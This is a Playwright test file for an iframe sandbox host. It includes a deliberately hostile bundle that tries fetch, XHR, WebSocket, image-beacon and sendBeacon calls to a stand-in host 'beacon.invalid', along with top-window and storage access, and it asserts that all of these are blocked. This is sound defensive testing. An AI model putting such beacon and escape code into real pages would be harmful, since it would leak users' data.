import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import {
  SURFACE_SANDBOX_IFRAME_FLAGS,
  buildSandboxDocument,
} from '../../../packages/surface-shell/src/sandbox/document';

/**
 * Proves the web sandbox posture in a real browser, with the REAL shell
 * artifact and the host's real document assembly:
 * 1. a hostile bundle attempting fetch/XHR/WebSocket/beacons/window.top
 *    fails on every attempt, no network request ever leaves, and the
 *    harness stays alive;
 * 2. the Session-3 poll fixture runs end-to-end through the iframe:
 *    render → state update re-render → tap → invoke message → permission
 *    off disables.
 */

const shellRoot = join(__dirname, '..', '..', '..', 'packages/surface-shell');

function readShell() {
  try {
    return {
      js: readFileSync(join(shellRoot, 'dist/surface-shell.js'), 'utf8'),
      css: readFileSync(join(shellRoot, 'dist/surface-shell.css'), 'utf8'),
    };
  } catch {
    throw new Error(
      'shell artifact missing — run `pnpm build:surface-shell` at the repo root first'
    );
  }
}

function readPollFixture() {
  const dir = join(shellRoot, 'fixtures/poll');
  return {
    bundle: readFileSync(join(dir, 'app.js'), 'utf8'),
    spec: JSON.parse(readFileSync(join(dir, 'spec.json'), 'utf8')),
    state: JSON.parse(readFileSync(join(dir, 'state.json'), 'utf8')),
  };
}

const HOSTILE_BUNDLE = `
(function () {
  const results = {};
  const report = () => parent.postMessage(
    JSON.stringify({ type: 'probe-results', results }), '*'
  );
  const probes = [];

  probes.push(
    fetch('https://beacon.invalid/fetch')
      .then(() => { results.fetch = 'succeeded'; })
      .catch(() => { results.fetch = 'blocked'; })
  );

  try {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://beacon.invalid/xhr');
    xhr.onerror = () => { results.xhr = 'blocked'; };
    xhr.onload = () => { results.xhr = 'succeeded'; };
    xhr.send();
    probes.push(new Promise((resolve) => setTimeout(resolve, 400)));
  } catch (e) {
    results.xhr = 'blocked';
  }

  try {
    const ws = new WebSocket('wss://beacon.invalid/ws');
    ws.onerror = () => { results.websocket = 'blocked'; };
    ws.onopen = () => { results.websocket = 'succeeded'; };
    probes.push(new Promise((resolve) => setTimeout(resolve, 400)));
  } catch (e) {
    results.websocket = 'blocked';
  }

  probes.push(new Promise((resolve) => {
    const img = new Image();
    img.onerror = () => { results.imageBeacon = 'blocked'; resolve(); };
    img.onload = () => { results.imageBeacon = 'succeeded'; resolve(); };
    img.src = 'https://beacon.invalid/pixel.gif';
    setTimeout(resolve, 400);
  }));

  // navigator.sendBeacon returns true when the UA merely QUEUES the
  // payload; CSP still blocks the actual transmission. So its return value
  // is not an egress signal — the authoritative proof is the network-level
  // assertion below that no request ever reaches the beacon host. We still
  // fire it here so that request assertion is meaningful.
  try {
    results.sendBeacon = navigator.sendBeacon
      ? navigator.sendBeacon('https://beacon.invalid/b', 'x')
        ? 'queued-but-not-sent'
        : 'refused'
      : 'unavailable';
  } catch (e) {
    results.sendBeacon = 'threw';
  }

  try {
    void window.top.document.title;
    results.topAccess = 'succeeded';
  } catch (e) {
    results.topAccess = 'blocked';
  }

  try {
    window.localStorage.getItem('x');
    results.storage = 'succeeded';
  } catch (e) {
    results.storage = 'blocked';
  }

  Promise.all(probes).then(() => {
    report();
    // and prove the harness is still alive after all that
    surface.register({
      render: function (state) {
        return surface.html\`<div class="still-alive">harness alive</div>\`;
      },
    });
  });
})();
`;

async function mountSandbox(
  page: import('@playwright/test').Page,
  doc: string
) {
  await page.setContent(
    '<!doctype html><html><body style="margin:0"></body></html>'
  );
  await page.evaluate(
    ({ doc, flags }) => {
      const w = window as unknown as { __received: unknown[] };
      w.__received = [];
      window.addEventListener('message', (event) => {
        const frame = document.querySelector('iframe');
        if (frame && event.source === frame.contentWindow) {
          let data: unknown = event.data;
          if (typeof data === 'string') {
            try {
              data = JSON.parse(data);
            } catch {
              return;
            }
          }
          w.__received.push(data);
        }
      });
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', flags);
      iframe.setAttribute('srcdoc', doc);
      iframe.style.width = '800px';
      iframe.style.height = '600px';
      iframe.style.border = '0';
      document.body.appendChild(iframe);
    },
    { doc, flags: SURFACE_SANDBOX_IFRAME_FLAGS }
  );
}

async function received(page: import('@playwright/test').Page) {
  return page.evaluate(
    () => (window as unknown as { __received: unknown[] }).__received
  );
}

async function postToSandbox(
  page: import('@playwright/test').Page,
  message: unknown
) {
  await page.evaluate((serialized) => {
    document
      .querySelector('iframe')
      ?.contentWindow?.postMessage(serialized, '*');
  }, JSON.stringify(message));
}

test('hostile bundle: every egress and escape attempt fails; harness survives', async ({
  page,
}) => {
  const shell = readShell();
  // Playwright's 'request' event fires on ATTEMPTS, CSP-blocked ones
  // included — so the egress proof is that no beacon request ever
  // succeeds. A blocked/failed request emits 'requestfailed' and never a
  // response; only a request that actually reached the host produces one.
  const succeeded: string[] = [];
  page.on('response', (response) => succeeded.push(response.url()));
  page.on('requestfinished', (request) => succeeded.push(request.url()));

  const doc = buildSandboxDocument({
    shellJs: shell.js,
    shellCss: shell.css,
    bundleSource: HOSTILE_BUNDLE,
  });
  await mountSandbox(page, doc);

  await expect
    .poll(async () =>
      (await received(page)).some(
        (message) => (message as { type?: string }).type === 'probe-results'
      )
    )
    .toBe(true);

  const probeResults = (await received(page)).find(
    (message) => (message as { type?: string }).type === 'probe-results'
  ) as { results: Record<string, string> };

  // every probe with an observable outcome is blocked
  expect(probeResults.results.fetch).toBe('blocked');
  expect(probeResults.results.xhr).toBe('blocked');
  expect(probeResults.results.websocket).toBe('blocked');
  expect(probeResults.results.imageBeacon).toBe('blocked');
  expect(probeResults.results.topAccess).toBe('blocked');
  expect(probeResults.results.storage).toBe('blocked');

  // the authoritative egress proof: NO request to the beacon host ever
  // succeeded — covers sendBeacon (whose synchronous return value only
  // reports queueing, not transmission) and every other probe alike.
  expect(succeeded.filter((url) => url.includes('beacon.invalid'))).toEqual([]);

  // the harness posted ready and still renders after the probes
  const ready = (await received(page)).find(
    (message) => (message as { type?: string }).type === 'ready'
  );
  expect(ready).toMatchObject({ shellVersion: 1, protocolVersion: 1 });

  await postToSandbox(page, {
    type: 'init',
    protocolVersion: 1,
    spec: { surfaceId: 's', specRevision: 1, actions: {} },
    state: {},
    theme: 'light',
    canInvoke: false,
  });
  await expect(page.frameLocator('iframe').locator('.still-alive')).toHaveText(
    'harness alive'
  );
});

test('poll fixture end-to-end through the real iframe host document', async ({
  page,
}) => {
  const shell = readShell();
  const poll = readPollFixture();
  const doc = buildSandboxDocument({
    shellJs: shell.js,
    shellCss: shell.css,
    bundleSource: poll.bundle,
  });
  await mountSandbox(page, doc);

  await expect
    .poll(async () =>
      (await received(page)).some(
        (message) => (message as { type?: string }).type === 'ready'
      )
    )
    .toBe(true);

  await postToSandbox(page, {
    type: 'init',
    protocolVersion: 1,
    spec: poll.spec,
    state: poll.state,
    theme: 'dark',
    canInvoke: true,
  });

  const frame = page.frameLocator('iframe');
  await expect(frame.locator('.tsh-card-title')).toHaveText(
    'What should we get for lunch?'
  );
  // one vote in fixture state
  await expect(frame.locator('.tsh-stat-value')).toHaveText('1');

  // state update re-renders
  await postToSandbox(page, {
    type: 'state',
    state: {
      ...poll.state,
      votes: { '~zod': 'pizza', '~ten': 'tacos', '~bus': 'pizza' },
    },
  });
  await expect(frame.locator('.tsh-stat-value')).toHaveText('3');

  // tap → invoke with actionId + rendered revision
  await frame.locator('.tsh-list-row button').first().click();
  await expect
    .poll(async () =>
      (await received(page)).find(
        (message) => (message as { type?: string }).type === 'invoke'
      )
    )
    .toEqual({
      type: 'invoke',
      actionId: 'vote-pizza',
      specRevision: poll.spec.specRevision,
    });

  // permission off disables live
  await postToSandbox(page, { type: 'permission', canInvoke: false });
  await expect(frame.locator('.tsh-list-row button').first()).toBeDisabled();
});
